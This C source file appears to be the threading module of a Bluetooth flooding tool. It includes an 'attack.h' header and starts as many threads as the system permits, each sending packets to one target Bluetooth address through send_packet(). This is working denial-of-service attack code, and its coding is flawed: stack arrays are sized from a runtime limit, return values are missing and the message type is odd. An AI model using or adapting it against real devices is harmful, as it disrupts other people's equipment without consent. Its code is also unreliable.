#include "attack.h"
#include "threads.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/sysinfo.h>
#include <bluetooth/bluetooth.h>

#define MAX_THREADS sysconf(_SC_THREAD_THREADS_MAX)

void *thread_function(void *arg){
	thread_args_t *args = (thread_args_t *)arg;
	send_packet(&args->addr , &args->message);
}


int run_threads(bdaddr_t *addr , const char msg){
	if (MAX_THREADS == -1){
		perror("Failed to get The Max number of Threads");
		return 1;
	}
	pthread_t threads[MAX_THREADS];
	int thread_ids[MAX_THREADS];
	thread_args_t thread_args[MAX_THREADS];

	for (int i = 0; i < MAX_THREADS; i++){
		thread_args[i].addr = *addr;
		thread_args[i].message = msg;
		thread_args[i].thread_id = i;
		thread_ids[i] = i;
		if (pthread_create(&threads[i] , NULL , thread_function , &thread_args[i]) != 0){
			perror("Failed to Create Thread");
			return 1;
		}
	}
	for (int i = 0; i < MAX_THREADS; i++) {
        	if (pthread_join(threads[i], NULL) != 0) {
            		perror("Failed to join thread");
            		return 1;
        }
    }
}
